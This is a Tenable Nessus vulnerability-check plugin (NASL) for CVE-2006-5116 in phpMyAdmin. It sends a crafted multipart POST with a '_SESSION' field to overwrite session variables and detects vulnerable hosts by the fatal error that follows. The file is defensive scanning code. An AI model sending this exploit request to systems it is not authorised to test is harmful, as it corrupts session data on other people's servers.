#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that suffers from
multiple issues. 

Description :

The version of phpMyAdmin installed on the remote host allows an
unauthenticated attacker to bypass variable blacklisting in its
globalization routine and destroy, for example, the contents of
session variables. 

See also :

http://www.hardened-php.net/advisory_072006.130.html
http://archives.neohapsis.com/archives/fulldisclosure/2006-10/0006.html
http://www.phpmyadmin.net/home_page/security.php?issue=PMASA-2006-5

Solution :

Upgrade to phpMyAdmin version 2.9.0.1 or later.

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(22512);
  script_version("$Revision: 1.1 $");

  script_cve_id("CVE-2006-5116");
  script_bugtraq_id(20253);

  script_name(english:"phpMyAdmin < 2.9.1 Multiple Vulnerabilities");
  script_summary(english:"Tries to pass in a numeric key in phpMyAdmin");

  script_description(english:desc);

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("phpMyAdmin_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpMyAdmin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Grab index.php.
  url = string(dir, "/index.php");
  res = http_get_cache(item:url, port:port);
  if (res == NULL) exit(0);

  # Don't check if we see an error like the one we'll try to generate.
  if (
    "Fatal error" >< res ||
    "Call to a member function on a non-object in" >< res
  ) exit(0);

  # Try to overwrite $_SESSION via 'libraries/grab_globals.lib.php'.
  # If successful, this will lead to a fatal error later in 
  # 'libraries/common.lib.php'. 
  boundary = "bound";
  req = string(	
    "POST ",  url, " HTTP/1.1\r\n",
    "Host: ", get_host_name(), "\r\n",
    "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
    "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
    # nb: we'll add the Content-Length header and post data later.
  );
  boundary = string("--", boundary);
  postdata = string(
    boundary, "\r\n", 
    'Content-Disposition: form-data; name="_SESSION"; filename="nessus";', "\r\n",
    "Content-Type: text/plain\r\n",
    "\r\n",
    "foo\r\n",

    boundary, "--", "\r\n"
  );
  req = string(
    req,
    "Content-Length: ", strlen(postdata), "\r\n",
    "\r\n",
    postdata
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  # There's a problem if we see a fatal error.
  if (res && "Call to a member function on a non-object in" >< res) 
    security_warning(port);
  # what to do if (res == NULL) (eg, error display is disable but
  # app is vulnerable)???
}
